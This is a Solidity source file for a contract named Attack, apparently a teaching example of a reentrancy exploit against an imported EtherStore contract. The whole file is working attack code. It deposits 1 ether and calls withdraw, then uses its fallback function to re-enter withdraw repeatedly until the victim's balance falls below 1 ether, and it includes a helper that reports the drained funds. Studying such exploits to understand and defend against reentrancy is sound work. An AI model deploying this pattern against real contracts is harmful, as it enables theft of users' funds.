// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "./EtherStore.sol";


contract Attack {

    EtherStore public etherstore;

    constructor(address _etherStoreAddress) {
        etherstore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherstore).balance >= 1 ether) {
            etherstore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherstore.deposit{value: 1 ether}();
        etherstore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}